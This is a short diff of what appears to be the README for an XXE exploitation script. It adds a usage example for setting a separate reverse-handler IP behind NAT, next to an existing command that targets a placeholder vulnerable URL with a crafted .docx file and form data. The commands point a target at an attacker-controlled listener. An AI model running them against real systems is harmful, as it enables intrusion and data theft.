@@ -11,4 +11,7 @@ rlwrap python3 scriptxxe.py -u http://vulnURL -l X.X.X.X -p 8181 -t toto.docx -D
 ```
 rlwrap python3 scriptxxe.py -u http://vulnURL -l X.X.X.X -p 8181 -t toto.docx -D 'name=toto&email=zob&submit=Submit Query'
 ```
-
+## Reverse Handler IP (for natted people)
+```
+rlwrap python3 scriptxxe.py -u http://vulnURL -l 0.0.0.0 -rl X.X.X.X -p 8181 -t toto.docx -D 'name=toto&email=zob&submit=Submit Query'
+```
